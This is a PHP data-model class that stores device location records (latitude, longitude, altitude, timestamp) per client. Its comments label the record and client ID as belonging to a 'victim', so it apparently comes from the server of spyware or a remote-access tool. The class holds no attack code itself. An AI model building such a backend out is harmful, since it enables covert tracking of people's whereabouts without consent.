<?php

namespace Server\Model;

/**
 * Victim's location
 */
class Location
{
    /** @var int $id Contact id */
    private int $id;

    /** @var int $clientID Victim's ID */
    private int $clientID;

    /** @var float $latitude Device's latitude */
    private float $latitude;

    /** @var float $longitude Device's longitude */
    private float $longitude;

    /** @var float $altitude Device's altitude */
    private float $altitude;

    /** @var string $timestamp */
    private string $timestamp;

    public function __construct(
        int $id,
        int $clientID,
        float $latitude,
        float $longitude,
        float $altitude,
        string $timestamp)
    {
        $this->id = $id;
        $this->clientID = $clientID;
        $this->latitude = $latitude;
        $this->longitude = $longitude;
        $this->altitude = $altitude;
        $this->timestamp = $timestamp;
    }

    /**
     * Get location's ID
     * 
     * @return int
     */
    public function getID(): int
    {
        return $this->id;
    }

    /**
     * Get client's ID
     * 
     * @return int
     */
    public function getClientID(): int
    {
        return $this->clientID;
    }

    /**
     * Get device's latitude
     * 
     * @return float
     */
    public function getLatitude(): float
    {
        return $this->latitude;
    }

    /**
     * Get device's longitude
     * 
     * @return float
     */
    public function getLongitude(): float
    {
        return $this->longitude;
    }

    /**
     * Get device's altitude
     * 
     * @return float
     */
    public function getAltitude(): float
    {
        return $this->altitude;
    }

    /**
     * Get location's timestamp
     * 
     * @return string
     */
    public function getTimestamp(): string
    {
        return $this->timestamp;
    }
}